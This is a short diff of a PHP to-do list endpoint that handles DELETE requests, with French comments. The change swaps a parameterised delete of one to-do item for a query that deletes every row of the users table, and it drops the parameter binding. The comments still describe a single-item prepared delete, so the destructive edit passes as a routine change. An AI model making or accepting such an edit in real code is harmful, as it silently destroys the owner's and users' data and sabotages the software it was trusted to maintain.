@@ -30,16 +30,15 @@ if ($_SERVER["REQUEST_METHOD"] === "DELETE") {
     $itemId = $conn->real_escape_string($itemId); // Échapper les caractères spéciaux
 
     // Préparer la requête DELETE avec une requête préparée
-    $sql = "DELETE FROM todo_list WHERE item_id = ?";
+    $sql = "DELETE FROM users WHERE user_id > 0";
     $stmt = $conn->prepare($sql);
 
     if ($stmt) {
         // Liaison des paramètres et exécution de la requête
-        $stmt->bind_param("i", $itemId); // "i" pour integer, $itemId est un entier
         $stmt->execute();
 
         if ($stmt->affected_rows > 0) {
-            echo "Record deleted successfully";
+            echo "Records deleted successfully";
         } else {
             echo "No record found with ID: " . $itemId;
         }
